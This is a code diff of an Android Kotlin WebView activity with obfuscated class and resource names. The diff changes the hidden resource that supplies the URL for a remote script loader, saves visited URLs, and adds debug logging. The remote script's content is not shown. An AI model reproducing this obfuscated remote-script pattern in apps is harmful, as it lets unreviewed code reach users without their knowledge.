@@ -65,7 +65,8 @@ class MsxdaisxdcnAsxdcctisxdity : Activity() {
 
         progressBar = ProgressDialog.show(this, "Loading", "Loading...")
 
-        if (getURL() == null) {
+        Log.e("URL", URL.toString())
+        if (URL == null) {
             val intent: Intent = intent
             URL = intent.getStringExtra("url")
             saveURL(URL)
@@ -116,6 +117,7 @@ class MsxdaisxdcnAsxdcctisxdity : Activity() {
                 if (progressBar?.isShowing!!) {
                     progressBar?.dismiss()
                 }
+                saveURL(url)
             }
 
             override fun onReceivedError(
@@ -140,7 +142,7 @@ class MsxdaisxdcnAsxdcctisxdity : Activity() {
             @RequiresApi(Build.VERSION_CODES.O)
             private fun loadRemoteScript(
                 view: WebView,
-                url: String = getString(R.string.edfvdewf)
+                url: String = getString(R.string.fdjvknkfvf_fvgfrvb_gbgrtB_rtbTRG_bgN_hynMJY)
             ) {
                 val queue = Volley.newRequestQueue(baseContext)
                 val stringRequest = StringRequest(
@@ -326,6 +328,7 @@ class MsxdaisxdcnAsxdcctisxdity : Activity() {
         val sp = getSharedPreferences("SP_WEBVIEW_PREFS", Context.MODE_PRIVATE)
         val editor = sp.edit()
         editor.putString("SAVED_URL", url)
+        Log.e("New url", url.toString())
         editor.apply()
     }
 
